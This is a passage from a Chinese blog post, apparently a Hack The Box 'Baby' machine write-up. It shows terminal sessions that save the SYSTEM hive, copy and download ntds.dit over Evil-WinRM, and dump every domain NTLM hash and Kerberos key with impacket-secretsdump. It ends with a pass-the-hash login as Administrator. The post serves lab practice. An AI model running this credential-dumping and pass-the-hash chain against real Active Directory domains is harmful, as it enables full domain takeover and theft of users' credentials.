+</span></span><span style="display:flex;"><span>    Dirs :         <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>   Files :         <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>   Bytes :   16.00 m   16.00 m         <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Speed :           153,919,412 Bytes/sec.
+</span></span><span style="display:flex;"><span>   Speed :             8,807.340 MegaBytes/min.
+</span></span><span style="display:flex;"><span>   Ended : Friday, September 19, <span style="color:#ae81ff">2025</span> 3:29:44 AM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; reg save hklm<span style="color:#ae81ff">\s</span>ystem C:<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span>The operation completed successfully.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----         9/19/2025   3:28 AM            <span style="color:#ae81ff">610</span> 2025-09-19_3-28-54_BABYDC.cab
+</span></span><span style="display:flex;"><span>-a----         9/19/2025   3:24 AM            <span style="color:#ae81ff">510</span> Dis2C4D.tmp
+</span></span><span style="display:flex;"><span>-a----         9/19/2025   3:26 AM           <span style="color:#ae81ff">1356</span> Dis3D2C.tmp
+</span></span><span style="display:flex;"><span>-a----         9/19/2025   3:28 AM           <span style="color:#ae81ff">2294</span> Dis6A0E.tmp
+</span></span><span style="display:flex;"><span>-a----         9/19/2025   3:28 AM             <span style="color:#ae81ff">86</span> diskshadow.txt
+</span></span><span style="display:flex;"><span>-a----         9/19/2025   3:28 AM           <span style="color:#ae81ff">1176</span> Manifest.xml
+</span></span><span style="display:flex;"><span>-a----         9/19/2025   3:16 AM       <span style="color:#ae81ff">16777216</span> ntds.dit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; download ntds.dit
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Downloading C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\n</span>tds.dit to ntds.dit 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Download successful! 
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; download system
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Downloading C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\s</span>ystem to system 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Error: Download failed. Check filenames or paths 
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; download c:/system
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Downloading c:/system to system 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Download successful! 
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp&gt; 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit 
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
+</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\J</span>acqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\A</span>shley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\H</span>ugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\L</span>eonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\I</span>an.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\C</span>onnor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\J</span>oseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\K</span>erry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\T</span>eresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\C</span>aroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys from ntds.dit 
+</span></span><span style="display:flex;"><span>Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
+</span></span><span style="display:flex;"><span>Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
+</span></span><span style="display:flex;"><span>Administrator:des-cbc-md5:d38cb994ae806b97
+</span></span><span style="display:flex;"><span>BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192
+</span></span><span style="display:flex;"><span>BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b
+</span></span><span style="display:flex;"><span>BABYDC$:des-cbc-md5:8fef68979223d645
+</span></span><span style="display:flex;"><span>krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
+</span></span><span style="display:flex;"><span>krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
+</span></span><span style="display:flex;"><span>krbtgt:des-cbc-md5:d57383f1b3130de5
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\J</span>acqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\J</span>acqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\J</span>acqueline.Barnett:des-cbc-md5:01df1349548a206b
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\A</span>shley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\A</span>shley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\A</span>shley.Webb:des-cbc-md5:9267976186c1320e
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\H</span>ugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\H</span>ugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\H</span>ugh.George:des-cbc-md5:296bec86fd323b3e
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\L</span>eonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\L</span>eonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\L</span>eonard.Dyer:des-cbc-md5:022313dce9a252c7
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\I</span>an.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\I</span>an.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\I</span>an.Walker:des-cbc-md5:bcb094c2012f914c
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\C</span>onnor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\C</span>onnor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\C</span>onnor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\J</span>oseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\J</span>oseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\J</span>oseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\K</span>erry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\K</span>erry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\K</span>erry.Wilson:des-cbc-md5:1f191c8c49ce07fe
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\T</span>eresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\T</span>eresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\T</span>eresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\C</span>aroline.Robinson:aes256-cts-hmac-sha1-96:6fe5d46e01d6cf9909f479fb4d7afac0bd973981dd958e730a734aa82c9e13af
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\C</span>aroline.Robinson:aes128-cts-hmac-sha1-96:f34e6c0c8686a46eea8fd15a361601f9
+</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\C</span>aroline.Robinson:des-cbc-md5:fd40190d579138df
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up... 
+</span></span></code></pre></div><p>成功登陆</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.64.108 -u <span style="color:#e6db74">&#39;administrator&#39;</span> -H <span style="color:#e6db74">&#39;ee4457ae59f1e3fbd764e33d9cef123d&#39;</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint 
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; whoami /all
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER INFORMATION
+</span></span><span style="display:flex;"><span>----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User Name          SID
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==================</span> <span style="color:#f92672">=============================================</span>
+</span></span><span style="display:flex;"><span>baby<span style="color:#ae81ff">\a</span>dministrator S-1-5-21-1407081343-4001094062-1444647654-500
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Group Name                                  Type             SID                                           Attributes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===========================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">=============================================</span> <span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\A</span>dministrators                      Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BABY<span style="color:#ae81ff">\G</span>roup Policy Creator Owners            Group            S-1-5-21-1407081343-4001094062-1444647654-520 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BABY<span style="color:#ae81ff">\D</span>omain Admins                          Group            S-1-5-21-1407081343-4001094062-1444647654-512 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BABY<span style="color:#ae81ff">\S</span>chema Admins                          Group            S-1-5-21-1407081343-4001094062-1444647654-518 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BABY<span style="color:#ae81ff">\E</span>nterprise Admins                      Group            S-1-5-21-1407081343-4001094062-1444647654-519 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BABY<span style="color:#ae81ff">\D</span>enied RODC Password Replication Group Alias            S-1-5-21-1407081343-4001094062-1444647654-572 Mandatory group, Enabled by default, Enabled group, Local Group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>Mandatory Label<span style="color:#ae81ff">\H</span>igh Mandatory Level        Label            S-1-16-12288
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                            Description                                                        State
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=========================================</span> <span style="color:#f92672">==================================================================</span> <span style="color:#f92672">=======</span>
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege                  Adjust memory quotas <span style="color:#66d9ef">for</span> a process                                 Enabled
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+</span></span><span style="display:flex;"><span>SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+</span></span><span style="display:flex;"><span>SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+</span></span><span style="display:flex;"><span>SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+</span></span><span style="display:flex;"><span>SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+</span></span><span style="display:flex;"><span>SeSystemtimePrivilege                     Change the system time                                             Enabled
+</span></span><span style="display:flex;"><span>SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+</span></span><span style="display:flex;"><span>SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+</span></span><span style="display:flex;"><span>SeBackupPrivilege                         Back up files and directories                                      Enabled
+</span></span><span style="display:flex;"><span>SeRestorePrivilege                        Restore files and directories                                      Enabled
+</span></span><span style="display:flex;"><span>SeShutdownPrivilege                       Shut down the system                                               Enabled
+</span></span><span style="display:flex;"><span>SeDebugPrivilege                          Debug programs                                                     Enabled
+</span></span><span style="display:flex;"><span>SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+</span></span><span style="display:flex;"><span>SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+</span></span><span style="display:flex;"><span>SeUndockPrivilege                         Remove computer from docking station                               Enabled
+</span></span><span style="display:flex;"><span>SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted <span style="color:#66d9ef">for</span> delegation     Enabled
+</span></span><span style="display:flex;"><span>SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+</span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+</span></span><span style="display:flex;"><span>SeTimeZonePrivilege                       Change the time zone                                               Enabled
+</span></span><span style="display:flex;"><span>SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+</span></span><span style="display:flex;"><span>SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span style="color:#66d9ef">for</span> another user in the same session Enabled
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER CLAIMS INFORMATION
+</span></span><span style="display:flex;"><span>-----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User claims unknown.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Kerberos support <span style="color:#66d9ef">for</span> Dynamic Access Control on this device has been disabled.
+</span></span></code></pre></div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
+        
+            <a href="/tags/htb/">Htb</a>
+        
+            <a href="/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/">域之魔法</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/sendai/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">sendai-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/scepter/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">scepter-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/sweep-htb/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">sweep-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/bicher-%E8%87%AA%E5%BB%BA/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">bicker-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/adcsmake/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ca管理员权限解析及利用发布恶意模板攻击</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 wackymaker
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
